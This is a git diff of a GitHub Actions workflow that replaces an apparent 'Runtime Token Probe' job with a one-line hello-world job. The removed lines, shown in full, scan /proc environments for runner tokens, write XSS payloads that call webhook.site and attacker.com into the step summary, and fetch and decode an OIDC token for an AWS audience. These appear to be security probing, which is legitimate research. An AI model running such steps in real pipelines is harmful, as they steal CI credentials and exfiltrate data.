@@ -1,63 +1,10 @@
-name: Runtime Token Probe
+name: Simple
 on:
   push:
     branches: [main]
-permissions:
-  contents: read
-  id-token: write
 jobs:
-  run:
+  test:
     runs-on: ubuntu-latest
-    if: contains(github.event.head_commit.message, 'RUNTIME-PROBE')
+    if: "contains(github.event.head_commit.message, 'SIMPLE-TEST')"
     steps:
-      - name: Capture ACTIONS_RUNTIME_TOKEN via /proc
-        run: |
-          echo "=== OWN PROCESS ==="
-          echo "PID: $$"
-          echo "PPID: $PPID"
-          echo ""
-          echo "=== PARENT PROCESS ENVIRONMENT ==="
-          # Read parent's env for ACTIONS_RUNTIME_TOKEN
-          cat /proc/$PPID/environ 2>/dev/null | tr '\0' '\n' | grep "ACTIONS_RUNTIME" || echo "no ACTIONS_RUNTIME in parent env"
-          echo ""
-          echo "=== ALL PROCESSES ENVIRON SCAN ==="
-          # Scan all accessible /proc/*/environ for runner tokens
-          for pid in /proc/[0-9]*/environ; do
-            content=$(cat "$pid" 2>/dev/null | tr '\0' '\n')
-            if echo "$content" | grep -q "ACTIONS_RUNTIME_TOKEN"; then
-              echo "FOUND in $pid:"
-              echo "$content" | grep "ACTIONS_RUNTIME_TOKEN" | head -c 100
-              echo ""
-              echo "$content" | grep "ACTIONS_RUNTIME_URL" | head -c 100
-              echo ""
-              echo "$content" | grep "ACTIONS_CACHE_URL" | head -c 100
-              break
-            fi
-          done
-          echo "(scan done)"
-
-      - name: Step Summary injection payloads
-        run: |
-          {
-            echo "# HTML Injection Test - github.com context"
-            echo ""
-            echo "<script>fetch('https://webhook.site/xss?d='+document.domain)</script>"
-            echo "<img src=x onerror=fetch('https://webhook.site/xss?err='+document.domain)>"
-            echo "<svg onload=alert(document.domain)><rect/></svg>"
-            echo "<style>*{color:red}</style>"
-            echo "<iframe src=//attacker.com></iframe>"
-          } >> "$GITHUB_STEP_SUMMARY"
-          echo "Summary written. Check: https://github.com/dannyggg3/cache-poison-test/actions/runs/$GITHUB_RUN_ID"
-
-      - name: OIDC claims - push/main context
-        run: |
-          T=$(curl -sf \
-            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value')
-          echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "
-import sys,json
-d=json.load(sys.stdin)
-print('=== FULL OIDC CLAIMS (push to main) ===')
-for k,v in sorted(d.items()):
-  print(k+': '+str(v))
-"
+      - run: echo hello-world
